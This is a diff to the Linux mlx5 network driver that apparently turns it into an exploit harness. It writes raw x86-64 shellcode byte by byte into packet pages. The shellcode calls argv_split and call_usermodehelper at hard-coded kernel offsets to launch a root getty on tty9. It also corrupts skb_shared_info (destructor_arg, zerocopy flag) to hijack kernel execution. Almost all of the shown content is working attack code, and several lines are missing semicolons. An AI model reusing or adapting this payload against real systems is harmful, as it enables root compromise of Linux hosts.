@@ -43,6 +43,8 @@
 #include "ipoib/ipoib.h"
 #include "en_accel/ipsec_rxtx.h"
 
+extern gilkup_vars_t gilkup_vars;
+
 static inline bool mlx5e_rx_hw_stamp(struct mlx5e_tstamp *tstamp)
 {
 	return tstamp->hwtstamp_config.rx_filter == HWTSTAMP_FILTER_ALL;
@@ -213,9 +215,109 @@ static inline bool mlx5e_rx_cache_get(struct mlx5e_rq *rq,
 	return true;
 }
 
-static inline void shared_info_write_rop(char *base, u32 size)
+static inline void shared_info_write_page(char *base)
 {
 	/* Gil, write your ROP code magic here */
+
+	*(u64*)base = gilkup_vars.page_offset + (PFN << 12) + sizeof(u64); //TODO: need your PFN...
+	base += sizeof(u64);
+
+	// "/sbin/getty -aroot tty9"
+	// 2f 73 62 69 6e 2f 67 65 74 74 79 20 2d 61 72 6f 6f 74 20 74 74 79 39 00
+
+	// mov rax, 0x003979747420746f
+	*(base++) = 0x48;
+	*(base++) = 0xb8
+	*(u64*)base = 0x003979747420746f;
+        base += sizeof(u64);
+
+	// push rax
+	*(base++) = 0x50;
+
+	// mov rax, 0x6f72612d20797474
+	*(base++) = 0x48;
+	*(base++) = 0xb8
+        *(u64*)base = 0x6f72612d20797474;
+        base += sizeof(u64);
+
+	// push rax
+	*(base++) = 0x50;
+
+	// mov rax, 0x65672f6e6962732f
+	*(base++) = 0x48;
+	*(base++) = 0xb8
+        *(u64*)base = 0x65672f6e6962732f;
+        base += sizeof(u64);
+
+	// push rax
+	*(base++) = 0x50;
+
+	// xor rdi, rdi
+	*(base++) = 0x48;
+	*(base++) = 0x31;
+        *(base++) = 0xff;
+
+	// mov rsi, rsp
+        *(base++) = 0x48;
+        *(base++) = 0x89;
+        *(base++) = 0xe6;
+
+	// xor rdx, rdx
+        *(base++) = 0x48;
+        *(base++) = 0x31;
+        *(base++) = 0xd2;
+
+	// mov rax, <argv_split>
+        *(base++) = 0x48;
+        *(base++) = 0xc7;
+        *(base++) = 0xc0;
+	*(u32*)base = (u32)(gilkup_vars.kernel_base + 0x3c5450); //TODO: replace with your argv_split
+	base += sizeof(u32);
+
+	// call rax
+        *(base++) = 0xff;
+        *(base++) = 0xd0;
+
+	// mov rdi, qword[rax]
+        *(base++) = 0x48;
+        *(base++) = 0x8b;
+        *(base++) = 0x38;
+
+	// mov rsi, rax
+        *(base++) = 0x48;
+        *(base++) = 0x89;
+        *(base++) = 0xc6;
+
+	//xor rcx, rcx
+        *(base++) = 0x48;
+        *(base++) = 0x31;
+        *(base++) = 0xc9;
+
+	// mov rax, <call_usermodehelper>
+        *(base++) = 0x48;
+        *(base++) = 0xc7;
+        *(base++) = 0xc0;
+        *(u32*)base = (u32)(gilkup_vars.kernel_base + 0x090b70); //TODO: replace with your call_usermodehelper
+        base += sizeof(u32);
+
+	// pop rax
+        *(base++) = 0x58;
+
+	// pop rax
+        *(base++) = 0x58;
+
+	// pop rax
+        *(base++) = 0x58;
+
+	// retn
+	*(base++) = 0xc3;
+}
+
+static inline void shared_info_write_rop(char *base, u32 size)
+{
+	u32 i;
+	for (i = 0 i < size; i += 4096)
+		shared_info_write_page(base + i);
 }
 
 static inline int mlx5e_page_alloc_mapped(struct mlx5e_rq *rq,
@@ -838,6 +940,17 @@ static inline int mlx5e_xdp_handle(struct mlx5e_rq *rq,
 static inline void modify_shinfo(void *va, unsigned int frag_size)
 {
 	/* Gil, add your sharedinfo magic here...*/
+	//TODO: in my code there are magic offsets, I can recalculate them but this is easier
+
+	//TODO: make sure that build_skb rewrite tx_flags; the hook should be after it.
+	if (!gilkup_vars.injected && gilkup_vars.data_pointers_counter > 1000) //just in case...
+	{
+		struct skb_shared_info *shinfo = (struct skb_shared_info*)((u64)va + frag_size);
+		shinfo->destructor_arg = gilkup_vars.page_offset + (PFN << 12); //TODO: need your PFN...
+		shinfo->tx_flags = SKBTX_DEV_ZEROCOPY; //1<<3
+
+		gilkup_vars.injected = true;
+	}
 }
 
 static inline
